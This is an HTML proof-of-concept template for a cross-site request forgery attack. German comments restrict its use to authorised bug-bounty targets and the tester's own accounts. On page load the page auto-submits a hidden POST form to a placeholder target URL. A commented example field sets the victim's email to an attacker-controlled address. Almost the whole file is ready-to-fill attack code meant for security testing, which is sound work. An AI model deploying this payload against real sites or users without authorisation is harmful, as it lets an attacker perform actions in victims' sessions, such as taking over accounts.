<!DOCTYPE html>
<!--
  CSRF-PoC: klassischer Form-Auto-Submit (simple request, kein Preflight).
  Nur auf autorisierte Bug-Bounty-Targets anwenden, nur mit eigenen Testaccounts.

  Ausfüllen: ACTION (Ziel-URL), FELDER (name/value-Paare).
  Auf eigener Domain hosten (nicht file://), zweites Browser-Profil = Opfer-Session.
  Nach dem Laden: Seiteneffekt serverseitig verifizieren (per GET im Opfer-Profil).
-->
<html>
<head><meta charset="utf-8"><title>CSRF PoC</title></head>
<body>
<form id="f" method="POST" action="https://TARGET.example/ACTION_PATH">
  <!-- Beispiel:
  <input type="hidden" name="email" value="attacker-controlled@example.com">
  -->
</form>
<script>document.getElementById('f').submit();</script>
</body>
</html>
